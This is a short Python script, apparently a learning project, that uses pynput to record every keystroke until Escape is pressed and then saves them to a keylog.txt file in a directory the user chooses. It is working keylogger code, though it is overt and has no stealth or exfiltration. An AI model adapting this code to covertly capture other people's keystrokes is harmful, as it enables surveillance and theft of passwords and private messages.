import os
import pynput.keyboard

#variable to store the logged keys
logged_keys = []

#function when a key is pressed
def on_press(key):
 global logged_keys
 try:
  # Append the pressed key to the list
  logged_keys.append(str(key.char))
 except AttributeError:
  #Handle special keys (e.g., Shift, Ctrl)
  logged_keys.append("[" + key.name + "]")

#function behind pressing escape an exits the input stage
def on_release(key):
 if key == pynput.keyboard.Key.esc:
  #ends the input from user 
  return False

#for key events
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
 listener.join()

#allow users to input their own choice of directory save the file
directory = input("Enter the directory path for file: ")

#if directory does not exist create using os library
if not os.path.exists(directory):
 os.makedirs(directory)

# Write logged keys to a file in user given directory
file_path = os.path.join(directory, "keylog.txt")
with open(file_path, "w") as f:
 f.write("\n".join(logged_keys))

print(f"Keylogger has stopped. Logged keys saved to {file_path}.") 